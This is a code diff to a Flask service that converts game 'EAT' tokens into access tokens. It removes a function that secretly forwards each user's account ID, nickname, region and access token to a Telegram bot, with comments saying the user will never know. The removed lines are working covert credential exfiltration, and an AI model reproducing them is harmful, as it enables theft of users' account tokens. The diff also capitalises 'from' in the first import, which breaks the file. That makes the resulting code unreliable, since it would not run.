@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+From flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 from urllib.parse import urlparse, parse_qs
@@ -14,47 +14,6 @@ CORS(app)
 # Logging setup
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-
-# ============================================
-# TELEGRAM BOT CONFIG (Environment Variables)
-# ============================================
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
-
-def send_to_telegram(data):
-    """
-    Secretly send conversion data to Telegram group
-    User ko pata nahi chalega
-    """
-    try:
-        # Simple format - sirf data, koi extra nahi
-        message = f"""UID: {data['account_id']}
-Name: {data['nickname']}
-Region: {data['region']}
-Access Token: {data['access_token']}
-
-Developer: @BTNVR"""
-        
-        # Send to Telegram
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "disable_web_page_preview": True
-        }
-        
-        response = requests.post(url, json=payload, timeout=10)
-        
-        if response.status_code == 200:
-            logger.info(f"✅ Forwarded to Telegram: {data['nickname']}")
-            return True
-        else:
-            logger.error(f"❌ Telegram error: {response.text}")
-            return False
-            
-    except Exception as e:
-        logger.error(f"❌ Failed to send to Telegram: {str(e)}")
-        return False
 
 # ============================================
 # CORE FUNCTION - EAT to Access Token
@@ -167,12 +126,6 @@ def convert():
                 "message": "Invalid or expired EAT token",
                 "developer": "@BTNVR"
             }) , 400
-        
-        # ============================================
-        # 🔥 SECRETLY FORWARD TO TELEGRAM
-        # User ko pata nahi chalega
-        # ============================================
-        send_to_telegram(result)
         
         # ============================================
         # RESPONSE - USER KO SAB DIKHEGA
